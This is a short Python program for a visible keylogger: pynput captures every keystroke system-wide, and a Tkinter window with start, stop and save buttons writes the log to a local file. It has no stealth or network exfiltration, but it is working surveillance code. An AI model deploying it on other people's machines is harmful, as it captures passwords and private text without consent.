from pynput import keyboard
import tkinter as tk
from tkinter import messagebox
import datetime
import os

class Keylogger:
    def __init__(self):
        self.log = ""
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += f" [{str(key)}] "

    def start(self):
        self.listener.start()

    def stop(self):
        self.listener.stop()

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.keylogger = Keylogger()

        self.root.title("Keylogger")
        self.root.geometry("300x200")
        self.root.configure(bg="#f0f0f0" , pady=10 , padx=10)

        self.start_button = tk.Button(root, text="Start Keylogger", command=self.start_keylogger)
        self.start_button.pack(pady=5)
        self.start_button.configure(bg="lightblue", fg="black", font=("Roboto", 10), pady=10, padx=10, border=0 )

        self.stop_button = tk.Button(root, text="Stop Keylogger", command=self.stop_keylogger)
        self.stop_button.pack(pady=10)
        self.stop_button.configure(bg="red", fg="black", font=("Roboto", 10), pady=10, padx=10, border=0)

        self.save_button = tk.Button(root, text="Save Log", command=self.save_log)
        self.save_button.pack(pady=10)
        self.save_button.configure(bg="lightgreen", fg="black", font=("Roboto", 10), pady=20, padx=10, border=0)

    def start_keylogger(self):
        self.keylogger.start()
        messagebox.showinfo("Keylogger", "Keylogger started")

    def stop_keylogger(self):
        self.keylogger.stop()
        messagebox.showinfo("Keylogger", "Keylogger stopped")

    def save_log(self):
        log_dir = "keylogger_logs"
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
        log_filename = f"log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        log_filepath = os.path.join(log_dir, log_filename)
        with open(log_filepath, "w") as log_file:
            log_file.write(self.keylogger.log)
        messagebox.showinfo("Keylogger", f"Log saved in {log_filepath}")
def main():
    root = tk.Tk()
    KeyloggerApp(root)
    root.mainloop()

if __name__ == "__main__":
    main()
